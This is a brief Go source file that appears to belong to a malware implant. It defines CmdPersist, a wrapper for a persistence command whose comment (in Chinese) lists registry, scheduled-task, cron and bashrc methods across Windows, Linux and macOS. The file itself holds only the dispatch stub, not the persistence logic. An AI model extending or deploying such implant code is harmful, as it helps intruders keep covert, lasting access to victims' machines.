package services

import "implant/core/commands"

// CmdPersist 持久化命令包装。cmdBuf 为 "方法 [名称]"（如 registry、schtasks MyTask、cron、bashrc）。
// 实现见 core/commands/commands_persist_{windows,linux,darwin}.go。
func CmdPersist(cmdBuf []byte) ([]byte, error) {
	return commands.Persist(string(cmdBuf))
}
